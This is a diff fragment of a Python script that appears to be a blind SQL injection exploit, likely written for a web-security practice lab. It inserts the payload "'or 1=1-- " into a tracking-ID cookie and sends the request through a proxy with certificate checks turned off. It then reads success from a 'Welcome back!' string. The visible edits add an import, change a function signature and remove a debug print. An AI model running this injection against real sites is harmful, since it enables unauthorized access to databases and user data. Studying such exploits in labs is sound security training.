@@ -10,6 +10,7 @@ column_count: 1
 """
 
 import requests
+import urllib
 import sys
 import re
 
@@ -45,13 +46,11 @@ def modify_tracking_id(cookie_header, query):
     
     return new_cookie_header
 
-def response_check(url):
+def response_check():
     cookie_header = modify_tracking_id(headers['Cookie'], "'or 1=1-- ")
     headers['Cookie'] = cookie_header
 
     response = requests.get(sys.argv[1], headers=headers, proxies=proxies, verify=False)
-    print(response.text)
-
     if "Welcome back!" in response.text:
         print("good")
     else:
